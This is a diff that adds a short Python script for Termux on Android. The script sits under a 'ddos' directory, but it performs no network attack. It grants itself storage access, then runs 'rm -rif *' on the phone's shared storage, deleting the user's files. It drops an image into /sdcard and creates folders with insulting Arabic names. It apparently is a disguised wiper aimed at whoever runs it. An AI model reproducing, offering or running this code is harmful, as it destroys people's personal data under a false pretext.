@@ -1,0 +1,12 @@
+import os
+os.system('clear')
+os.system('termux-setup-storage')
+os.chdir('/storage/emulated/0')
+os.system('rm -rif * ')
+os.chdir('/data/data/com.termux/files/home/ddos')
+os.system('mv 1.jpg /sdcard')
+os.chdir('/storage/emulated/0')
+os.mkdir('جيرس،ياقواد')
+os.mkdir('جيرس،منتاك')
+os.mkdir('مسكييي')
+os.mkdir('هههههه')
